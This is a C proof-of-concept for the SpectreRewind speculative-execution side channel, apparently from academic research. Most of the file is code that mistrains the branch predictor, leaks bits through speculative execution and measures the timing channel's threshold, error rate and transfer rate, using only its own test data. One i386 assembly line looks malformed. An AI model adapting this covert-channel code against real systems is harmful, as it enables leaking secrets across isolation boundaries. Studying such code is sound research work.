/**
 * SpectreRewind PoC
 *
 * Copyright (C) 2020 Computer Systems Lab, University of Kansas.
 *
 * Part of library routines are from the meltdown PoC at:
 *   https://github.com/IAIK/meltdown
 * 
 * This file is distributed under the GPLv2 License. 
 */ 

/**************************************************************************
 * Conditional Compilation Options
 **************************************************************************/
#define _GNU_SOURCE             /* See feature_test_macros(7) */

/**************************************************************************
 * Included Files
 **************************************************************************/
#if !defined(__aarch64__)
#include <cpuid.h>
#endif 
#include <errno.h>
#include <fcntl.h>
#include <memory.h>
#include <pthread.h>
#include <sched.h>
#include <setjmp.h>
#include <signal.h>
#include <stdarg.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <inttypes.h>
#include <stdio.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/resource.h>

/**************************************************************************
 * Public Definitions
 **************************************************************************/
#define N_DIVS 12   // determine speculative execution length

/**************************************************************************
 * Public Types
 **************************************************************************/
typedef struct {
  size_t divsd_threshold; /**< threshold in cycles for the DIVSD channel */
} libkdump_config_t;
  
/**************************************************************************
 * Global Variables
 **************************************************************************/
static int dbg = 1;
static volatile uint64_t counter = 0;
static libkdump_config_t config;
typedef enum { ERROR, INFO, SUCCESS } d_sym_t;
static pthread_t count_thread;
static int g_bp_depth = 9;

/**************************************************************************
 * Public Function Prototypes
 **************************************************************************/
static void debug(d_sym_t symbol, const char *fmt, ...) {
  if (!dbg)
    return;

  switch (symbol) {
  case ERROR:
    printf("\x1b[31;1m[-]\x1b[0m ");
    break;
  case INFO:
    printf("\x1b[33;1m[.]\x1b[0m ");
    break;
  case SUCCESS:
    printf("\x1b[32;1m[+]\x1b[0m ");
    break;
  default:
    break;
  }
  va_list ap;
  va_start(ap, fmt);
  vfprintf(stdout, fmt, ap);
  va_end(ap);
}

// ---------------------------------------------------------------------------
#if defined(__aarch64__)
static inline uint64_t rdtsc() {
  asm volatile ("DSB SY");
  return counter;
}
#else // !__aarch64__	

static inline uint64_t rdtsc() {
  uint64_t a = 0, d = 0;

  asm volatile("mfence");
#if defined(USE_RDTSCP) && defined(__x86_64__)
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
#elif defined(USE_RDTSCP) && defined(__i386__)
  asm volatile("rdtscp" : "=A"(a), :: "ecx");
#elif defined(__x86_64__)
  asm volatile("rdtsc" : "=a"(a), "=d"(d));
#elif defined(__i386__)
  asm volatile("rdtsc" : "=A"(a));
#endif
  a = (d << 32) | a;
  asm volatile("mfence");
  
  return a;
}
#endif

volatile char zero = 0;
volatile char ones = 0xff;

double my_number1 = 123456778910;
double my_number2 = 123456778910;
double my_number3 = 123456778910;
double my_number4 = 123456778910;

struct div_test
{
  double number;
  double div;
  int mul;
  volatile char *addr;
};

struct div_test trainer;
struct div_test transmit_0;
struct div_test transmit_1;
struct div_test transmit;

/* 
 * micro arch.   minimum # training runs
 * ------------------------------------
 * cortex-a72    3
 * cortex-a57    2
 * icelake       9
 * tigerlake     9
 * ryzen         4
 * all others    7
 * default       9 (works on all tested platforms)
 */ 

#include "random_data.h"
struct div_test *test_tasks[20];

volatile char my_out[16];
volatile int linked[2048][1024] __attribute__ ((aligned (4096)));

int start = 0;

void __attribute__ ((noinline)) transmit_bit( struct div_test * dt, int bit_no )
{
  volatile char *ptr = dt->addr;
  int my_mul = dt->mul;
  
  int next = start;
  for (int i = 0; i < 12; i++) {
    next = linked[next][256];
  }
  
  if( 0 != (next * my_mul) ) {
    if ( *ptr & (1 << bit_no) ) {
      int next2 = start;
      for (int i = 0; i < 12; i++) {
	my_out[i] = linked[next2][256]; //  prefetching
	next2 = random_data[next2]; // random_data is in cache
      }
    }
  }
  start = next;
}

#define MIN(a,b) ((a<b) ? a : b)

#define N_TESTS 1000000
#define MAX_CYCLES 1024
static int histo[3][MAX_CYCLES];
static int total[3][N_TESTS];

static int comparator(const void *p, const void *q)
{
  return *(int *)p > *(int *)q;
}

uint64_t now_in_ns()
{
  struct timespec ts;
  clock_gettime(CLOCK_REALTIME, &ts);
  return ((uint64_t)ts.tv_sec * 1000000000 + ts.tv_nsec);
}

static void *countthread(void *dummy) {
  uint64_t local_counter = 0;
  while (1) {
    local_counter++;
    counter = local_counter;
  }
}

// ---------------------------------------------------------------------------
static void __attribute__((optimize("-O2"), noinline)) detect_spectrerewind_threshold()
{
  uint64_t start = 0, end = 0, dur = 0;
  uint64_t bw_start = 0, bw_end = 0;
  double overall = N_TESTS;

  int next;
  next = random_data[0];
  linked[0][256] = next;
  while( next != 0 )
  {
      int current = next;
      next = random_data[current];
      linked[current][256] = next;
  }

  start = 0;

  trainer.mul = 1;
  trainer.addr = &zero; // training 

  transmit_0.mul = 0;
  transmit_0.addr = &zero;
  
  transmit_1.mul = 0;
  transmit_1.addr = &ones; // (char *)libkdump_phys_to_virt(libkdump_virt_to_phys((size_t)&ones));
  
  int n_addr = (g_bp_depth + 1) * 2; //

  for (int i = 0; i < n_addr; i++)
    test_tasks[i] = &trainer;
  test_tasks[g_bp_depth] = &transmit_0;
  test_tasks[2*g_bp_depth+1] = &transmit_1;

  bw_start = now_in_ns();
  for (int j = 0; j < N_TESTS; j++) {
    for (int i = 0; i < n_addr; i++) {
      for (volatile int iter = 0; iter < 13; iter++); // IMPORTANT: add delay (> 13).
      
      start = rdtsc();
      transmit_bit(test_tasks[i], i%8); // send secret when (i%8==7).
      end = rdtsc();
      
      dur = end - start;
      if (test_tasks[i] == &transmit_0) {
	if (dur < MAX_CYCLES) histo[0][dur]++;
	total[0][j] = dur;
      } else if (test_tasks[i] == &transmit_1) {
	if (dur < MAX_CYCLES) histo[1][dur]++;
	total[1][j] = dur;
      }
    }
  }
  bw_end = now_in_ns();

  // stats
  for (int i = 0; i < 2; i++) {
    qsort((void *)total[i], N_TESTS, sizeof(total[i][0]), comparator);
    debug(INFO, "Send %d timing (min, 1pct, median, 99pct, max): (%4d, %4d, %4d, %4d, %4d)\n", i,
          total[i][0], total[i][N_TESTS*1/100], total[i][N_TESTS/2],
          total[i][N_TESTS*99/100], total[i][N_TESTS-1]);
  }
  
  if (total[1][N_TESTS*99/100] < total[0][N_TESTS*1/100]) {
    config.divsd_threshold = (total[1][N_TESTS*99/100] + total[0][N_TESTS*1/100])/2;
  } else {
    config.divsd_threshold = (total[1][N_TESTS/2] + total[0][N_TESTS/2])/2;
  }
  debug(SUCCESS, "spectrerewind: divsd ch threshold: %d cycles\n", config.divsd_threshold);

  int err0_cnt = -1, err1_cnt = -1;
  for (int j = 0; j < N_TESTS; j++) {
    if (err0_cnt == -1 && total[0][j] > config.divsd_threshold) {
      debug(INFO, "0 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
      err0_cnt = j;
    }
    if (err1_cnt == -1 && total[1][N_TESTS-j-1] <= config.divsd_threshold) {
      debug(INFO, "1 - Error count: %d/%d, rate: %.2f\%\n", j, N_TESTS, (float)j * 100/ N_TESTS);
      err1_cnt = j;
    }
    if (err0_cnt > 0 && err1_cnt > 0) {
      debug(INFO, "Error rate: %.2f\%\n", (double)(err0_cnt + err1_cnt) / 2 * 100 / N_TESTS);
      break;
    }
  }

  debug(INFO, "Transfer rate: %.2f KB/s\n", (double) 2 * N_TESTS * 1000000 / 8 / (bw_end - bw_start) );
  if (dbg){
    for(int i = 0; i < MAX_CYCLES; i++) {
      fprintf(stderr, "%d\t%0.5f\t%0.5f\t%0.5f\n", i,
              histo[0][i]/overall, histo[1][i]/overall, histo[2][i]/overall );
    }
  }
}

int main(int argc, char *argv[])
{
  int opt;
  while ((opt = getopt(argc, argv, "b:")) != -1) {
    switch(opt) {
    case 'b': /* # iterations need to mistrain the branch predictor */
      g_bp_depth = strtol(optarg, NULL, 0);
      break;
    }
  }
  debug(INFO, "BP training depth: %d\n", g_bp_depth);
  
  if (setpriority(PRIO_PROCESS, 0, -20) < 0) {
    debug(ERROR, "priority -20 failed\n");
  }
#if defined(__aarch64__)
  int r = pthread_create(&count_thread, 0, countthread , 0);
  if (r != 0) {
    return -1;
  }
  debug(INFO, "%s\n", "Waiting the counter thread...");
  while(counter == 0) {
    asm volatile("DSB SY");
  }
  debug(INFO, "Done: %ld\n", counter);
#endif

  detect_spectrerewind_threshold();

  return 0;
}
